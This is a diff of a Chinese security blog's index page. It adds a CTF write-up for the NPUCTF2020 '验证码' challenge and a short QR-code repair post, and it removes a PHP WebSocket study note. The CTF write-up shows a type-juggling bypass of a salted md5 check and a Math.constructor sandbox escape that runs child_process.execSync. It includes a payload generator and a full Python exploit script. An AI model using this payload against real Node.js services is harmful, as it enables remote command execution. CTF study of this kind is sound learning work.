@@ -207,6 +207,299 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5efc80b37.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d5efc80b37.html" class="post-title-link" itemprop="url">NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-25 00:47:35" itemprop="dateCreated datePublished" datetime="2020-04-25T00:47:35+08:00">2020-04-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:28:23" itemprop="dateModified" datetime="2020-10-14T17:28:23+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li>我们用一段代码来看再JavaScript中的类型比较：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424150332.png" alt="20200424150332"></p>
+<ul>
+<li><p>可以看到数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
+</li>
+<li><p>而在JavaScript中各个数据类型的相加呢？</p>
+</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424162607.png" alt="20200424162607"></p>
+<p>可以看到对象和字符串相加最后得到的是字符串。而数组和字符串相加最后也是得到字符串。所以可以基本得出结论就是，<strong>node中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424180609.png" alt="20200424180609"></p>
+<p>而长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424215524.png" alt="20200424215524"></p>
+<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><pre><code class="javascript">app.post(&#39;/&#39;, function (req, res) {
+  let result = &#39;&#39;;
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;
+      } catch (e) {
+        console.log(e);
+        result = &#39;Wrong Wrong Wrong!!!&#39;;
+      }
+      results.unshift(`${req.body.e}=${result}`);
+    }
+  } else {
+    results.unshift(&#39;Not verified!&#39;);
+  }
+  if (results.length &gt; 13) {
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});</code></pre>
+<p>以这道题为例:</p>
+<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>要满足<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> 结合上面的结论我们我们想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：</p>
+<pre><code>{&quot;e&quot;:paylod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}</code></pre><p>这是因为数组利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
+<pre><code class="python">import requests
+import json
+headers = {
+    &quot;Content-Type&quot;:&quot;application/json&quot;
+}
+url = &quot;http://ff8efecb-b1bc-4df1-af3d-249b285a0c54.node3.buuoj.cn/&quot;
+data = {&quot;e&quot;:&#39;paylod&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
+r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)</code></pre>
+<p>这道题的第二关我一直没做出来,虽然看正则就知道是用math去RCE。</p>
+<h3 id="构造函数执行任意代码"><a href="#构造函数执行任意代码" class="headerlink" title="构造函数执行任意代码"></a>构造函数执行任意代码</h3><p>题目关键代码：</p>
+<pre><code class="javascript">function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) {
+    return null;
+  }
+  return eval(str);
+}</code></pre>
+<p>从正则可以看出只能嵌套Math而且Math只能用一个点，也就是只能用一层属性。</p>
+<p>我们再来看最终的payload:</p>
+<pre><code class="javascript">(Math=&gt;(
+    Math=Math.constructor,
+    Math.x=Math.constructor(
+        Math.fromCharCode(
+114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
+        )()))(Math+1)</code></pre>
+<p><code>Math=&gt;</code> 是什么意思？我们来看个简单的例子：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424231655.png" alt="20200424231655"></p>
+<p>可以发现最终是生成了个函数。是的这就是我们熟悉的匿名函数。<code>x =&gt; x * x</code> 相当于：</p>
+<pre><code class="javascript">function (x) {
+    return x * x;
+}</code></pre>
+<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424231946.png" alt="20200424231946"></p>
+<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424235002.png" alt="20200424235002"></p>
+<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
+<pre><code class="javascript">Math.constructor.constructor(.....)</code></pre>
+<p>而这又是什么呢，我们直接逐层测试的<code>Math.constructor</code> ：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425002236.png" alt="20200425002236"></p>
+<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：</p>
+<pre><code class="javascript">var sum = Math.constructor.constructor(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
+sum(1,2);
+var fun = new Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
+fun(1,2)</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425003241.png" alt="20200425003241"></p>
+<p>可以直接看到结果，<code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的。当然这个不知在Math中其他任意函数应该也是类似的。例如：alert()</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425003702.png" alt="20200425003702"></p>
+<p>而payload的最里面<code>fromCharCode</code>就很容易理解了就是把AIISC码转换为字符串,那么生成payload脚本如下：</p>
+<pre><code class="python">import re
+encode = lambda code: list(map(ord,code))
+decode = lambda code: &quot;&quot;.join(map(chr,code))
+a=f&quot;&quot;&quot;
+(m0=&gt;(
+        m0=m0.constructor,
+        m0.x=m0.constructor(
+            m0.fromCharCode({encode(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)&quot;)})
+        )()
+    ))(Math+1)
+&quot;&quot;&quot;
+a=re.sub(r&quot;[\s\[\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)
+print(a)
+</code></pre>
+<h3 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h3><pre><code class="python">import requests
+import json
+headers = {
+    &quot;Content-Type&quot;:&quot;application/json&quot;
+}
+url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot;
+data = {&quot;e&quot;:&#39;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
+r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)</code></pre>
+<p>GETFLAG:</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425004237.png" alt="20200425004237"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d44a4997a7.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d44a4997a7.html" class="post-title-link" itemprop="url">记一次MISC二维码的修复</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-24 13:12:50" itemprop="dateCreated datePublished" datetime="2020-04-24T13:12:50+08:00">2020-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:26:31" itemprop="dateModified" datetime="2020-10-14T17:26:31+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>103</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>二维码是个一半的二维码。</p>
+<p><img src="https://goodcheerleung.gitee.io/blog/qrcode1.png" alt="qcode"></p>
+<p>用qrazybox/进行修复（<a href="https://merricx.github.io/qrazybox/）就是把二维码全部涂上去，然后Tools" target="_blank" rel="noopener">https://merricx.github.io/qrazybox/）就是把二维码全部涂上去，然后Tools</a> - Extract QR Information</p>
+<p><img src="https://goodcheerleung.gitee.io/blog/20200424130627.png" alt="2"></p>
+<p><img src="https://goodcheerleung.gitee.io/blog/20200424130839.png" alt="20200424130839.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3e8844c56.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2080,493 +2373,6 @@ function public_key($length = 16) {
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d649bc731c.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d649bc731c.html" class="post-title-link" itemprop="url">Websocket-php学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-12-12 11:34:26" itemprop="dateCreated datePublished" datetime="2019-12-12T11:34:26+08:00">2019-12-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:07:07" itemprop="dateModified" datetime="2020-10-14T17:07:07+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="创建一个套接字"><a href="#创建一个套接字" class="headerlink" title="创建一个套接字"></a>创建一个套接字</h2><p>​        <code>socket_create</code>创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务器端。</p>
-<pre><code class="php">resource socket_create ( int $domain , int $type , int $protocol )</code></pre>
-<ul>
-<li><code>@parameter domain</code>参数指定哪个协议用在当前套接字上</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Domain</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong><code>AF_INET</code></strong></td>
-<td>IPv4 网络协议。TCP 和 UDP 都可使用此协议。</td>
-</tr>
-<tr>
-<td><strong><code>AF_INET6</code></strong></td>
-<td>IPv6 网络协议。TCP 和 UDP 都可使用此协议。</td>
-</tr>
-<tr>
-<td><strong><code>AF_UNIX</code></strong></td>
-<td>本地通讯协议。具有高性能和低成本的 IPC（进程间通讯）。</td>
-</tr>
-</tbody></table>
-<ul>
-<li><code>@parameter type</code>参数用于选择套接字使用的类型</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong><code>SOCK_STREAM</code></strong></td>
-<td>提供一个顺序化的、可靠的、全双工的、基于连接的字节流。支持数据传送流量控制机制。TCP 协议即基于这种流式套接字。</td>
-</tr>
-<tr>
-<td><strong><code>SOCK_DGRAM</code></strong></td>
-<td>提供数据报文的支持。(无连接，不可靠、固定最大长度).UDP协议即基于这种数据报文套接字。</td>
-</tr>
-<tr>
-<td><strong><code>SOCK_SEQPACKET</code></strong></td>
-<td>提供一个顺序化的、可靠的、全双工的、面向连接的、固定最大长度的数据通信；数据端通过接收每一个数据段来读取整个数据包。</td>
-</tr>
-<tr>
-<td><strong><code>SOCK_RAW</code></strong></td>
-<td>提供读取原始的网络协议。这种特殊的套接字可用于手工构建任意类型的协议。一般使用这个套接字来实现 ICMP 请求（例如 ping）。</td>
-</tr>
-<tr>
-<td><strong><code>SOCK_RDM</code></strong></td>
-<td>提供一个可靠的数据层，但不保证到达顺序。一般的操作系统都未实现此功能。</td>
-</tr>
-</tbody></table>
-<ul>
-<li><code>@parameter protocol</code>是设置指定 <code>domain</code> 套接字下的具体协议。这个值可以使用 <a href="http://php.net/manual/zh/function.getprotobyname.php" target="_blank" rel="noopener">getprotobyname()</a> 函数进行读取。如果所需的协议是 TCP 或 UDP，可以直接使用常量 <code>SOL_TCP</code> 和 <code>SOL_UDP</code> 。</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>icmp</td>
-<td>Internet Control Message Protocol 主要用于网关和主机报告错误的数据通信。例如“ping”命令（在目前大部分的操作系统中）就是使用 ICMP 协议实现的。</td>
-</tr>
-<tr>
-<td>udp</td>
-<td>User Datagram Protocol 是一个无连接的、不可靠的、具有固定最大长度的报文协议。由于这些特性，UDP 协议拥有最小的协议开销。</td>
-</tr>
-<tr>
-<td>tcp</td>
-<td>Transmission Control Protocol 是一个可靠的、基于连接的、面向数据流的全双工协议。TCP  能够保障所有的数据包是按照其发送顺序而接收的。如果任意数据包在通讯时丢失，TCP  将自动重发数据包直到目标主机应答已接收。因为可靠性和性能的原因，TCP 在数据传输层使用 8bit 字节边界。因此，TCP  应用程序必须允许传送部分报文的可能。</td>
-</tr>
-</tbody></table>
-<ul>
-<li><code>返回值</code>socket_create() 正确时返回一个套接字，失败时返回 <code>FALSE</code>。要读取错误代码，可以调用 <a href="http://php.net/manual/zh/function.socket-last-error.php" target="_blank" rel="noopener">socket_last_error()</a>。这个错误代码可以通过 <a href="http://php.net/manual/zh/function.socket-strerror.php" target="_blank" rel="noopener">socket_strerror()</a> 读取文字的错误说明。</li>
-</ul>
-<hr>
-<p>  <code>socket_bind</code>给套接字绑定名字,<strong>注意：</strong>绑定 <code>address</code> 到 <code>socket</code>。   该操作必须是在使用 <a href="https://www.php.net/manual/zh/function.socket-connect.php" target="_blank" rel="noopener">socket_connect()</a> 或者 <a href="https://www.php.net/manual/zh/function.socket-listen.php" target="_blank" rel="noopener">socket_listen()</a>   建立一个连接之前。  </p>
-<pre><code class="php"> socket_bind ( resource $socket , string $address [, int $port = 0 ] ) : bool</code></pre>
-<ul>
-<li><p><code>@parameter socket</code>用 <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> 创建的一个有效的套接字资源。      </p>
-</li>
-<li><p><code>@parameter address</code></p>
-<ul>
-<li>如果套接字是 <strong><code>AF_INET</code></strong> 族，那么       <code>address</code> 必须是一个四点分法的 IP 地址（例如 <em>127.0.0.1</em> ）。</li>
-<li>如果套接字是 <strong><code>AF_UNIX</code></strong> 族，那么 <code>address</code> 是 Unix 套接字一部分（例如 /tmp/my.sock ）</li>
-</ul>
-</li>
-<li><p><code>@parameter port</code>参数 <code>port</code> 仅仅用于 <strong><code>AF_INET</code></strong>       套接字连接的时候，并且指定连接中需要监听的端口号。      </p>
-</li>
-</ul>
-<hr>
-<p>  ​    <code>socket_listen</code>监听socket连接</p>
-<pre><code class="php"> socket_listen ( resource $socket [, int $backlog = 0 ] ) : bool</code></pre>
-<ul>
-<li><code>@parameter socket</code>用 <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> 创建的一个有效的套接字资源。</li>
-<li><code>@parameter backlog</code>端口号</li>
-</ul>
-<h2 id="创建套接字实例"><a href="#创建套接字实例" class="headerlink" title="创建套接字实例"></a>创建套接字实例</h2><pre><code class="php">public function service(){
-    $tcp = getprotobyname(&quot;tcp&quot;);    //获取tcp协议号码。
-    $sock = socket_create(AF_INET, SOCK_STREAM, $tcp);//创建一个套接字
-    socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
-    if($sock &lt; 0)
-    {
-        throw new Exception(&quot;failed to create socket: &quot;.socket_strerror($sock).&quot;\n&quot;);//获取错误
-    }
-    socket_bind($sock, $this-&gt;address, $this-&gt;port);//绑定IP和端口
-    socket_listen($sock, $this-&gt;port);//监听端口
-    echo &quot;listen on $this-&gt;address $this-&gt;port ... \n&quot;;
-    $this-&gt;_sockets = $sock;
-}</code></pre>
-<h2 id="握手处理"><a href="#握手处理" class="headerlink" title="握手处理"></a>握手处理</h2><ul>
-<li>我们直接从代码示例看,这个类方法传入了两个参数，一个是socket、一个是请求包，在接收到请求包后会遍历这个请求包，获取中的<code>Sec-WebSocket-Key&#39;</code>,<code>Sec-WebSocket-Key</code> 加上一个特殊字符串  <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>，然后计算 SHA-1 ，之后进行 BASE-64  编码，将结果做为 <code>Sec-WebSocket-Accept</code> 头的值并且插入在响应包中 返回给客户端。</li>
-<li><code>socket_write</code> 将字符串写入socket中</li>
-</ul>
-<pre><code class="php">socket_write( resource `$socket`   , string `$buffer`   [, int `$length` = 0  ] ) : int</code></pre>
-<pre><code class="php">/**
- * 握手处理
- * @param $newClient socket
- * @return int  接收到的信息
- */
-public function handshaking($newClient, $line){
-
-    $headers = array();
-    $lines = preg_split(&quot;/\r\n/&quot;, $line);
-    foreach($lines as $line)
-    {
-        $line = chop($line);//chop()若为空则移除\n\r空格之类的。
-        if(preg_match(&#39;/\A(\S+): (.*)\z/&#39;, $line, $matches))//正则获取header头
-        {
-            $headers[$matches[1]] = $matches[2];//将header存入数组
-        }
-    }
-    $secKey = $headers[&#39;Sec-WebSocket-Key&#39;];
-    $secAccept = base64_encode(pack(&#39;H*&#39;, sha1($secKey . &#39;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#39;)));
-    $upgrade  = &quot;HTTP/1.1 101 Web Socket Protocol Handshake\r\n&quot; .
-        &quot;Upgrade: websocket\r\n&quot; .
-        &quot;Connection: Upgrade\r\n&quot; .
-        &quot;WebSocket-Origin: $this-&gt;address\r\n&quot; .
-        &quot;WebSocket-Location: ws://$this-&gt;address:$this-&gt;port/websocket/websocket\r\n&quot;.
-        &quot;Sec-WebSocket-Accept:$secAccept\r\n\r\n&quot;;  //构造响应包
-    return socket_write($newClient, $upgrade, strlen($upgrade));
-}</code></pre>
-<h2 id="Websocket的数据处理"><a href="#Websocket的数据处理" class="headerlink" title="Websocket的数据处理"></a>Websocket的数据处理</h2><ul>
-<li><p><strong>数据帧格式</strong></p>
-<p>​    WebSocket客户端，服务端通信的最小单位是帧（frame）,由一个或多个帧组成一条完整的消息(message)</p>
-</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191205/15755606535758.png" alt="img"></p>
-<ul>
-<li><strong>数据帧格式详解</strong>：</li>
-</ul>
-<p><strong>FIN</strong></p>
-<p>​        如果是1，表示这是消息(message)的最后一个分片（fragment）,如果是0，表示不是消息（message）的最后一个分片（fragment）</p>
-<p><strong>Opcode</strong>: </p>
-<p>​            4个比特。</p>
-<p><strong>操作码</strong></p>
-<p>​        Opcode的值决定了应该如何解析后续的数据载荷（data payload）。如果操作码是不认识的，那么接收端应该断开连接（fail the connection）</p>
-<p><strong>Mask</strong>: 1个比特。</p>
-<p>​        从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。<br>如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。</p>
-<p><strong>Payload length</strong>: 数据载荷的长度。 7位  或  7 + 16 位  或  7 + 64位。</p>
-<p>​    假设 Payload length == x</p>
-<p>x 为 0-126： 数据长度为x字节.<br>x 为 126 ： 后续2个字节代表一个16位无符号整数<br>x  为 127 ： 后续8个字节代表一个64位无符号整数</p>
-<p><strong>掩码算法</strong>：</p>
-<p> 首先，假设：</p>
-<pre><code>original-octet-i：为原始数据的第i字节。
-transformed-octet-i：为转换后的数据的第i字节。
-j：为i mod 4的结果。
-masking-key-octet-j：为mask key第j字节。
-
-算法描述为： original-octet-i 与 masking-key-octet-j 异或后，得到 transformed-octet-i。</code></pre><ul>
-<li>数据帧的解析如下：</li>
-</ul>
-<pre><code class="php">/**
-     * 解析接收数据
-     * @param $buffer
-     * @return null|string
-     */
-    public function message($buffer){
-        $len = $masks = $data = $decoded = null;
-        $len = ord($buffer[1]) &amp; 127;//取出第8-15位
-        if ($len === 126)  { // 126&lt;=数据长度&lt;= 65535   Extended payload length 有 占用2个字节
-            $masks = substr($buffer, 4, 4);//帧格式 Masking-key 占用4字节
-            $data = substr($buffer, 8);//第九个字节（索引 8 ）开始 是数据
-        } else if ($len === 127)  { // 65535 &lt;= 数据长度  ；Extended payload length 有 占用8个字节
-            $masks = substr($buffer, 10, 4);// 说明 Extended payload length 占用 8个字节 2 + 8 所以从 10开始
-            $data = substr($buffer, 14);
-        } else  {
-            $masks = substr($buffer, 2, 4);
-            $data = substr($buffer, 6);
-        }
-        for ($index = 0; $index &lt; strlen($data); $index++) {
-            $decoded .= $data[$index] ^ $masks[$index % 4];//掩码转换为原文
-        }
-        return $decoded;  
-    }
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3e1694f0d.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d3e1694f0d.html" class="post-title-link" itemprop="url">Phar反序列化拓展攻击学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-12-12 11:31:04" itemprop="dateCreated datePublished" datetime="2019-12-12T11:31:04+08:00">2019-12-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:28:02" itemprop="dateModified" datetime="2020-10-14T17:28:02+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><blockquote>
